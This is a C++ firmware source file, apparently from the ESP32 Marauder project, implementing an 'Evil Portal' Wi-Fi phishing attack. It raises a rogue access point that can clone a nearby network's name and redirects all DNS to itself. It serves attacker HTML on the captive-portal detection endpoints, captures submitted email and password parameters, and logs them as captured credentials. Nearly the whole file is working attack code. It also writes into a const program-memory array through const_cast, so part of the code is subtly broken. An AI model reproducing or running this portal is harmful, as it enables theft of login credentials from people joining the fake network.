#include "EvilPortal.h"

#include <Arduino.h>

// --- Fixes: define the missing globals exactly once ---
// AP SSID used by captive portal
char apName[MAX_AP_NAME_SIZE + 1] = "ESP32-Marauder";

// The HTML payload served by the portal
const char index_html[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>ESP32 Marauder Portal</title>
</head>
<body>
  <h1>Welcome to the ESP32 Marauder Portal</h1>
  <p>Your connection is being intercepted.</p>
</body>
</html>
)rawliteral";
// -------------------------------------------------------

AsyncWebServer server(80);
DNSServer dnsServer;

EvilPortal::EvilPortal() {
}

void EvilPortal::setup() {
  runServer = false;
  name_received = false;
  password_received = false;
  has_html = false;
  has_ap = false;

#ifdef HAS_SD
  if (sd_obj.supported) {
    std::vector<String> html_files;
    sd_obj.listDirToLinkedList(html_files, "/", "html");
    Serial.println("Evil Portal Found " + String(html_files.size()) + " HTML files");
  }
#endif
}

void EvilPortal::cleanup() {
  ap_index = -1;
}

bool EvilPortal::begin(std::vector<ssid>* ssids, std::vector<AccessPoint>* aps) {
  if (!has_ap && !setAP(ssids, aps)) {
    return false;
  }
  if (!setHtml()) {
    return false;
  }
  startPortal();
  return true;
}

String EvilPortal::get_user_name() {
  return user_name;
}

String EvilPortal::get_password() {
  return password;
}

void EvilPortal::setupServer() {
  // serve portal root
  server.on("/", HTTP_GET, [this](AsyncWebServerRequest *request) {
    request->send_P(200, "text/html", index_html);
    Serial.println("client connected");
#ifdef HAS_SCREEN
    sendToDisplay("Client connected to server");
#endif
  });

  // captive portal endpoints
  const char* captiveEndpoints[] = {
    "/hotspot-detect.html", "/library/test/success.html", "/success.txt",
    "/generate_204", "/gen_204", "/ncsi.txt", "/connecttest.txt", "/redirect"
  };
  for (auto &ep : captiveEndpoints) {
    server.on(ep, HTTP_GET, [this](AsyncWebServerRequest *request) {
      request->send_P(200, "text/html", index_html);
    });
  }

  // return AP name
  server.on("/get-ap-name", HTTP_GET, [](AsyncWebServerRequest *request) {
    request->send(200, "text/plain", WiFi.softAPSSID());
  });

  // capture credentials
  server.on("/get", HTTP_GET, [this](AsyncWebServerRequest *request) {
    if (request->hasParam("email")) {
      user_name = request->getParam("email")->value();
      name_received = true;
    }
    if (request->hasParam("password")) {
      password = request->getParam("password")->value();
      password_received = true;
    }
    request->send(200, "text/html",
      "<html><head><script>"
      "setTimeout(()=>{window.location.href='/';},100);"
      "</script></head><body></body></html>");
  });

  Serial.println("web server up");
}

void EvilPortal::setHtmlFromSerial() {
  Serial.println("Setting HTML from serial...");
  String html = Serial.readString();
  html.trim();
  strncpy(const_cast<char*>(index_html), html.c_str(), sizeof(index_html)-1);
  has_html = true;
  using_serial_html = true;
  Serial.println("html set");
}

bool EvilPortal::setHtml() {
  if (using_serial_html) {
    Serial.println("html previously set");
    return true;
  }
  Serial.println("Setting HTML...");
#ifdef HAS_SD
  File f = sd_obj.getFile("/" + target_html_name);
#else
  File f;
#endif
  if (!f) {
#ifdef HAS_SCREEN
    sendToDisplay("Could not find /" + target_html_name);
    sendToDisplay("Touch to exit...");
#endif
    Serial.println("Could not find /" + target_html_name);
    return false;
  }
  if (f.size() > MAX_HTML_SIZE) {
#ifdef HAS_SCREEN
    sendToDisplay("HTML too large");
#endif
    Serial.println("HTML too large");
    f.close();
    return false;
  }
  String html = "";
  while (f.available()) {
    char c = f.read();
    if (isPrintable(c)) html += c;
  }
  strncpy(const_cast<char*>(index_html), html.c_str(), sizeof(index_html)-1);
  has_html = true;
  f.close();
  Serial.println("html set");
  return true;
}

bool EvilPortal::setAP(std::vector<ssid>* ssids, std::vector<AccessPoint>* aps) {
  String ap_config;
  // priority: SSID list > selected AP > config file
  if (!ssids->empty()) {
    ap_config = ssids->at(0).essid;
  } else {
    for (auto &ap : *aps) {
      if (ap.selected) {
        ap_config = ap.essid;
        break;
      }
    }
    if (ap_config.isEmpty()) {
#ifdef HAS_SD
      File cf = sd_obj.getFile("/ap.config.txt");
      if (cf) {
        while (cf.available()) {
          ap_config += cf.readStringUntil('\n');
        }
        cf.close();
      }
#endif
    }
  }
  if (ap_config.length() > MAX_AP_NAME_SIZE || ap_config.isEmpty()) {
    Serial.println("Invalid AP name");
    return false;
  }
  strncpy(apName, ap_config.c_str(), sizeof(apName)-1);
  has_ap = true;
  Serial.println("AP set to " + ap_config);
  return true;
}

bool EvilPortal::setAP(String essid) {
  if (essid.length() > MAX_AP_NAME_SIZE || essid.isEmpty()) {
    return false;
  }
  strncpy(apName, essid.c_str(), sizeof(apName)-1);
  has_ap = true;
  Serial.println("AP set to " + essid);
  return true;
}

void EvilPortal::startAP() {
  IPAddress apIP(172,0,0,1);
  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(apIP, apIP, IPAddress(255,255,255,0));
  WiFi.softAP(apName);
  Serial.println("AP started: " + String(apName));
#ifdef HAS_SCREEN
  sendToDisplay("AP started");
#endif
  Serial.println("AP IP: " + WiFi.softAPIP().toString());
  setupServer();
  dnsServer.start(53, "*", WiFi.softAPIP());
  server.addHandler(new CaptiveRequestHandler()).setFilter(ON_AP_FILTER);
  server.begin();
#ifdef HAS_SCREEN
  sendToDisplay("Evil Portal READY");
#endif
}

void EvilPortal::startPortal() {
  startAP();
  runServer = true;
}

void EvilPortal::sendToDisplay(String msg) {
#ifdef HAS_SCREEN
  String s = msg;
  while (s.length() < 40) s += ' ';
  display_obj.loading = true;
  display_obj.display_buffer.push_back(s);
  display_obj.loading = false;
#endif
}

void EvilPortal::main(uint8_t scan_mode) {
  if (scan_mode != WIFI_SCAN_EVIL_PORTAL || !has_ap || !has_html) {
    return;
  }
  dnsServer.processNextRequest();
  if (name_received && password_received) {
    name_received = password_received = false;
    String out = "u:" + user_name + " p:" + password + "\n";
    Serial.print(out);
    buffer_obj.append(out);
#ifdef HAS_SCREEN
    sendToDisplay("creds captured");
#endif
  }
}
